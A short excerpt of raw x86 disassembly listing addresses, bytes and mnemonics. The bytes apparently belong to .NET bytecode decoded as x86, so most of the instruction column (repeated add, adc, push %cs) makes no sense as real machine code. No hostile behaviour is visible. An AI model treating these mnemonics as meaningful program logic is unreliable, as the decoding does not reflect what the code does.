  404dca:	04 02                	add    $0x2,%al
  404dcc:	14 7d                	adc    $0x7d,%al
  404dce:	76 00                	jbe    0x404dd0
  404dd0:	00 04 02             	add    %al,(%edx,%eax,1)
  404dd3:	7c 73                	jl     0x404e48
  404dd5:	00 00                	add    %al,(%eax)
  404dd7:	04 08                	add    $0x8,%al
  404dd9:	28 95 00 00 0a 2a    	sub    %dl,0x2a0a0000(%ebp)
  404ddf:	00 41 1c             	add    %al,0x1c(%ecx)
  404de2:	00 00                	add    %al,(%eax)
  404de4:	00 00                	add    %al,(%eax)
  404de6:	00 00                	add    %al,(%eax)
  404de8:	0e                   	push   %cs
  404de9:	00 00                	add    %al,(%eax)
  404deb:	00 0d 01 00 00 1b    	add    %cl,0x1b000001
  404df1:	01 00                	add    %eax,(%eax)
  404df3:	00 20                	add    %ah,(%eax)
  404df5:	00 00                	add    %al,(%eax)
  404df7:	00 0b                	add    %cl,(%ebx)
  404df9:	00 00                	add    %al,(%eax)
  404dfb:	01 1b                	add    %ebx,(%ebx)
  404dfd:	30 05 00 c2 02 00    	xor    %al,0x2c200
  404e03:	00 27                	add    %ah,(%edi)
  404e05:	00 00                	add    %al,(%eax)
  404e07:	11 02                	adc    %eax,(%edx)
  404e09:	7b 7a                	jnp    0x404e85
  404e0b:	00 00                	add    %al,(%eax)
  404e0d:	04 0a                	add    $0xa,%al
  404e0f:	02 7b 7d             	add    0x7d(%ebx),%bh
  404e12:	00 00                	add    %al,(%eax)
  404e14:	04 0b                	add    $0xb,%al
  404e16:	06                   	push   %es
  404e17:	45                   	inc    %ebp
  404e18:	03 00                	add    (%eax),%eax
  404e1a:	00 00                	add    %al,(%eax)
  404e1c:	bb 00 00 00 c0       	mov    $0xc0000000,%ebx
  404e21:	01 00                	add    %eax,(%eax)
  404e23:	00 28                	add    %ch,(%eax)
  404e25:	02 00                	add    (%eax),%al
  404e27:	00 02                	add    %al,(%edx)
  404e29:	02 7b 7c             	add    0x7c(%ebx),%bh
  404e2c:	00 00                	add    %al,(%eax)
  404e2e:	04 8d                	add    $0x8d,%al
  404e30:	2e 00 00             	add    %al,%cs:(%eax)
  404e33:	01 7d 7e             	add    %edi,0x7e(%ebp)
  404e36:	00 00                	add    %al,(%eax)
  404e38:	04 02                	add    $0x2,%al
  404e3a:	16                   	push   %ss
